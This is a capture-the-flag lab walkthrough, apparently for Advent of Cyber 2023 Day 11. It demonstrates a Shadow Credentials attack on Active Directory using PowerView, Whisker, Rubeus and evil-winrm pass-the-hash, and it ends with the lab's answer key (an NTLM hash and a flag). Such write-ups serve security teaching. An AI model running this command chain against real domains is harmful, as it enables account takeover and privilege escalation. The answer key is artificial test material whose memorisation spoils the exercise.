# Task 17  [Day 11] Active Directory Jingle Bells, Shadow Spells
---

### Learning Objectives

- Understanding Active Directory
- Introduction to Windows Hello for Business
- Prerequisites for exploiting GenericWrite privilege
- How the Shadow Credentials attack works
- How to exploit the vulnerability

After Machine is up Open powershell and execute : 


```
cd C:\Users\hr\Desktop
```
moves to the folder containing all the exploitation tools.


```
powershell -ep bypass
```
will bypass the default policy for arbitrary PowerShell script execution.


```
. .\PowerView.ps1
```
loads the PowerView script into the memory.


At this point, we can enumerate the privileges by running:

Now, you can launch the full command:
```
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

After this, you’ll get to know the Vulnerable User — ***vansprinkles***

Now to get the hash of the user vansprinkles
run:
```
 .\Whisker.exe add /target:vansprinkles
```

The above command will give you a big hash.

Now copy the whole hash

and re run it by rebeus.exe 

It will give you an NTLM hash


<img width="1440" alt="Screenshot 2024-01-02 at 1 20 13 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/85bf2650-9d5f-4eb2-8cc0-d98381c4d9bd">

---

Now use evil-winrm to gain access :

Command
```
evil-winrm -i machine_ip -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
```

After accessing go to 
```
cd C:\Users\Administrator\Desktop
```

To get the flag

<img width="1044" alt="Screenshot 2024-01-02 at 1 24 20 AM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/29b59c46-16c0-494a-892f-709ce5b95d71">

---

QUESTIONS:

1. What is the hash of the vulnerable user?

Answer
```
03E805D8A8C5AA435FB48832DAD620E3
```

2. What is the content of flag.txt on the Administrator Desktop?

Answer
```
THM{XMAS_IS_SAFE}
```

---
   
